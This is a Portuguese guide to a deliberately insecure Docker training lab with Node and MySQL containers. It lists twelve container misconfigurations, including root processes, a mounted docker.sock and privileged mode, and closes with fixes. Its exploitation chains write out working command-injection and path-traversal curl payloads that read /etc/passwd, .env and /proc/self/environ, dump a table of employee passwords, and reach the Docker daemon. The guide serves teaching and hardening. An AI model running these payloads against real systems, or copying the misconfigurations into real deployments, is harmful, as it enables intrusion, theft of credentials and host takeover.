# Exploração de container — superlab

A stack `docker-compose.yml` sobe dois contêineres **intencionalmente inseguros**: `web` (Node, 3001) e `db` (MySQL, 3306). Este guia lista os problemas de container e como explorá-los a partir de uma falha da aplicação (ex.: command injection V9 ou path traversal V10).

```bash
docker compose up --build       # web: http://127.0.0.1:3001 · db: 127.0.0.1:3306
```

> ⚠️ Só rode local. As portas estão presas em `127.0.0.1`; remover esse prefixo expõe tudo à rede.

## Misconfigurações de container

| # | Problema | Onde | Impacto |
|---|---|---|---|
| C1 | Imagem "fat" `node:24` sem digest fixo | `app-vuln/Dockerfile` | superfície enorme, build não reprodutível |
| C2 | Segredo em `ARG`/`ENV` de build | `Dockerfile` | vaza em `docker history` |
| C3 | `COPY . .` leva `.env` e `secret-config.txt` para a imagem | `Dockerfile` | segredos embarcados |
| C4 | Processo roda como **root** (sem `USER`) | `Dockerfile` | qualquer RCE já é root no container |
| C5 | Sem `HEALTHCHECK` nem limites | `Dockerfile` | DoS, sem detecção de falha |
| C6 | Credenciais fracas e hardcoded | `docker-compose.yml` | acesso trivial ao banco |
| C7 | Porta do MySQL publicada | `docker-compose.yml` | banco exposto |
| C8 | MySQL sem TLS, auth antiga | `docker-compose.yml` | sniffing/força bruta |
| C9 | App conecta como **root** do banco | `docker-compose.yml` | SQLi vira controle total do SGBD |
| C10 | `privileged: true` | `docker-compose.yml` | **escape para o host** |
| C11 | `/var/run/docker.sock` montado | `docker-compose.yml` | **takeover do host** via daemon |
| C12 | `seccomp:unconfined`, caps padrão | `docker-compose.yml` | syscalls perigosas liberadas |

## Cadeias de exploração

### 1. RCE da app → shell no container (via V9)
```bash
curl "http://127.0.0.1:3001/api/tools/ping?host=127.0.0.1;id;uname -a"
curl "http://127.0.0.1:3001/api/tools/ping?host=x;cat%20/etc/passwd"
```
Como roda como root (C4), você já é root dentro do `web`.

### 2. Vazar segredos embarcados (C2/C3) via V10 ou V9
```bash
curl "http://127.0.0.1:3001/api/files?name=../secret-config.txt"
curl "http://127.0.0.1:3001/api/files?name=../../.env"
curl "http://127.0.0.1:3001/api/files?name=../../../../../../proc/self/environ"   # vaza DB_PASSWORD, BUILD_API_KEY
```

### 3. Pivô para o banco exposto (C6/C7/C9) via SSRF ou credenciais vazadas
Com as credenciais do passo 2 (`DB_USER=root`, `DB_PASSWORD=root`):
```bash
# a partir de um shell no container web:
curl "http://127.0.0.1:3001/api/tools/ping?host=x;mysql -h db -uroot -proot corp -e 'select email,password from employees'"
```

### 4. Escape para o host via docker.sock (C11) — o mais grave
Se o socket do Docker está montado, quem tem RCE no `web` controla o daemon e cria um container montando a raiz do host:
```bash
# dentro do container web (via V9), se houver cliente docker/curl:
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json   # lista containers = acesso ao daemon
```
Com acesso ao daemon dá para subir um container com `-v /:/host` e ler/escrever qualquer arquivo do host → **takeover completo**. `privileged: true` (C10) permite escapes adicionais via cgroups/devices mesmo sem o socket.

## Como corrigir (o que a pipeline deve exigir)
- `USER` não-root; imagem mínima (`-slim`/distroless) com digest fixo.
- Nunca `COPY . .` sem `.dockerignore`; segredos via secret manager, não em ARG/ENV/arquivo.
- **Nunca** montar `docker.sock`; sem `privileged`; `no-new-privileges`, seccomp/AppArmor, caps mínimas, FS read-only.
- Banco sem porta publicada; usuário com privilégio mínimo (não root); TLS; senha forte.
- Scanners: `trivy image`, `trivy config` (IaC/Dockerfile), `hadolint` no Dockerfile.
